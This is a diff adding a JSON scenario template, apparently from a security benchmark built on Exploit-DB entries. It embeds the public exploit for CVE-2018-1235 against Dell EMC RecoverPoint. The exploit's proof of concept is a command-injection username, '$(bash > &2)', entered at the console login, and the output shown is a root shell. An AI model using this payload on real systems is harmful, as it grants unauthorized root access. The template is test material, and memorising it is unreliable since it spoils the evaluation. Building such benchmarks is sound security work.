@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44920",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution (CVE-2018-1235)\n\nExploit source code (44920.txt):\n```\n# Exploit Title: Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution\n# Date: 2018-06-21\n# Exploit Author: Paul Taylor\n# Version: All versions before RP 5.1.2, and all versions before RP4VMs 5.1.1.3\n# Vendor Advisory: DSA-2018-095\n# Vendor KB: https://support.emc.com/kb/521234\n# Github: https://github.com/bao7uo/dell-emc_recoverpoint\n# Website: https://www.foregenix.com/blog/foregenix-identify-multiple-dellemc-recoverpoint-zero-day-vulnerabilities\n# Tested on: RP4VMs 5.1.1.2, RP 5.1.SP1.P2\n# CVE: CVE-2018-1235\n\n# 1. Description\n# An OS command injection vulnerability exists in the mechanism which processes usernames\n# which are presented for authentication, allowing unauthenticated root access\n# via tty console login.\n\n# 2. Proof of Concept\n# Inject into local tty console login prompt\n\nrecoverpoint login: $(bash > &2)\nroot@recoverpoint:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@recoverpoint:/#\n```",
+  "cve": "CVE-2018-1235",
+  "exploitdb_id": "44920",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44920",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
